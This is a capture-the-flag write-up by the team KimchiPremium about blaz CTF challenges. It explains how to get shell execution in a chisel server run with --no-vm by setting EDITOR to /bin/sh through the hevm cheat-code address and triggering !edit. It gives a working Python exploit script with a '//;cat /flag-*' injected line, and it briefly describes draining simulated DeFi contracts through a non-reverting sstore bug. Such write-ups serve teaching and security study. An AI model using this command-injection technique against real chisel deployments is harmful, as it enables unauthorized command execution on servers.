I played blaz CTF as [KimchiPremium](https://x.com/Web3Kimchi), had a lot of fun with the awesome kimchi hackers

The server runs `chisel` with the `--no-vm` option, and the -e (or -exec) keyword is disabled. The flag's filename is random, so we need to get a shell."

### chisel commands
---

```
No solidity versions installed! Installing solidity version 0.8.19...
Welcome to Chisel! Type `!help` to show available commands.
‚öíÔ∏è Chisel help
=============
General
    !help | !h - Display all commands
    !quit | !q - Quit Chisel
    !exec <command> [args] | !e <command> [args] - Execute a shell command and print the output

Session
    !clear | !c - Clear current session source
    !source | !so - Display the source code of the current session
    !save [id] | !s [id] - Save the current session to cache
    !load <id> | !l <id> - Load a previous session ID from cache
    !list | !ls - List all cached sessions
    !clearcache | !cc - Clear the chisel cache of all stored sessions
    !export | !ex - Export the current session source to a script file
    !fetch <addr> <name> | !fe <addr> <name> - Fetch the interface of a verified contract on Etherscan
    !edit - Open the current session in an editor

Environment
    !fork <url> | !f <url> - Fork an RPC for the current session. Supply 0 arguments to return to a local network
    !traces | !t - Enable / disable traces for the current session
    !calldata [data] | !cd [data] - Set calldata (`msg.data`) for the current session (appended after function selector). Clears it if no argument provided.

Debug
    !memdump | !md - Dump the raw memory of the current state
    !stackdump | !sd - Dump the raw stack of the current state
    !rawstack <var> | !rs <var> - Display the raw value of a variable's stack allocation. For variables that are > 32 bytes in length, this will display their memory pointer.
```
To execute shell commands, we need to find a command that uses `process::Command`. Not only the `exec` command, but also the `edit` command uses Command to open the editor.

```rust
ChiselCommand::Edit => {
    // create a temp file with the content of the run code
    let mut temp_file_path = std::env::temp_dir();
    temp_file_path.push("chisel-tmp.sol");
    let result = std::fs::File::create(&temp_file_path)
        .map(|mut file| file.write_all(self.source().run_code.as_bytes()));
    if let Err(e) = result {
        return DispatchResult::CommandFailed(format!(
            "Could not write to a temporary file: {e}"
        ))
    }

    // open the temp file with the editor
    let editor = std::env::var("EDITOR").unwrap_or_else(|_| "vim".to_string());
    let mut cmd = Command::new(editor);
    cmd.arg(&temp_file_path);

    match cmd.status() {
...
```
In the `edit` command, it saves the currently running code to `/tmp/chisel-tmp.sol` and then executes the editor with the file as an argument

With the [setEnv](https://book.getfoundry.sh/cheatcodes/set-env) function in the Vm cheat code, we can set the `EDITOR` environment variable to `/bin/sh` and execute the running code as a shell script. However, the `--no-vm `flag is set. What exactly does this flag do?

### --no-vm flag
---
```rust
 pub fn to_repl_source(&self) -> String {
    let Version { major, minor, patch, .. } = self.solc.version;
    let Self { contract_name, global_code, top_level_code, run_code, config, .. } = self;

    let (vm_import, vm_constant) = if !config.no_vm {
        (
            "import {Vm} from \"forge-std/Vm.sol\";\n",
            "Vm internal constant vm = Vm(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n"
        )
    } else {
        ("", "")
    };
```
In the chisel code, when the `--no-vm` flag is set, it doesn't import the `Vm` contract or set the `vm` constant. That's all. We can still call the cheat codes in the Vm contract using the address `address(uint160(uint256(keccak256("hevm cheat code"))))`.

By setting the `EDITOR` environment variable to `/bin/sh`, we can execute the contents of the running code as a shell script. However, the running code needs to be valid Solidity. To work around this, we can simply add a comment with `;` and run cat flag, like `//; cat /flag-*.`

### exploit
---
```python
import requests

url = "http://snwo.kr:3000/"

code = """
//;cat /flag-*
address hevm = address(uint160(uint256(keccak256("hevm cheat code"))));
interface VM { function setEnv(string calldata key, string calldata value) external; }
VM vm = VM(hevm);
vm.setEnv("EDITOR", "/bin/sh");
!edit
"""
uuid = requests.get(url+"run",params={"code":code}).json()['uuid']

r = requests.get(url+"out/"+uuid)
print(r.text)
```

Just a brief writeup. we earned  a total of `19,986,007` ETH. There was a bug that each state-related opcodes do not recover the state when it reverts. So we can leverage this to bypass check balance or smth.

```solidity
    function join(address usr, uint wad) external note {
        vat.move(address(this), usr, mul(ONE, wad));
        dai.burn(msg.sender, wad);
    }
    function exit(address usr, uint wad) external note {
        require(live == 1, "DaiJoin/not-live");
        vat.move(msg.sender, address(this), mul(ONE, wad));
        dai.mint(usr, wad);
    }
```
For example, in the MakerDAO contract, tokens are minted first and then the balance is checked. Since the sstore opcode doesn‚Äôt revert the state when the transaction reverts, we were able to keep the minted tokens.

We drained all WETH pairs of top TVL swaps, as well as flash loan contracts, bridges, and smth... It was a lot of fun exploring the Ethereum chain to drain the contracts ü´†
